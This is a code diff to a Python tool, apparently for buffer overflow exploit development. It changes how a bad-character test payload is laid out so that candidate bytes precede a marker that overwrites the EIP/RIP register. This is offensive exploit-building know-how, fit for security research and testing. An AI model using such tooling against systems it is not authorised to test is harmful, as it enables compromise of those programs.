@@ -638,9 +638,21 @@ class BadCharOrchestrator(object):
 
     def _build_payload(self, candidates):
         # type: (bytes) -> bytes
-        leading = bytes([self._filler_byte]) * self._offset
+        # Place magic+candidates at offset 0 so every candidate byte lands
+        # within the first recv() window, regardless of how large offset is.
+        # Layout: [MAGIC][candidates][filler*(offset-magic-cands)][MAGIC][pad]
+        # The second MAGIC overwrites EIP/RIP; the first anchors the dump.
+        prefix = self._magic + candidates
+        if len(prefix) > self._offset:
+            raise ValueError(
+                "offset ({}) must be >= len(magic) + len(candidates) ({}) "
+                "— not enough room for candidates before EIP".format(
+                    self._offset, len(prefix)
+                )
+            )
+        filler = bytes([self._filler_byte]) * (self._offset - len(prefix))
         trailing = bytes([self._pad_byte]) * self._pad_len
-        return leading + self._magic + candidates + trailing
+        return prefix + filler + self._magic + trailing
 
     def _resolve_dump_path(self):
         # type: () -> str
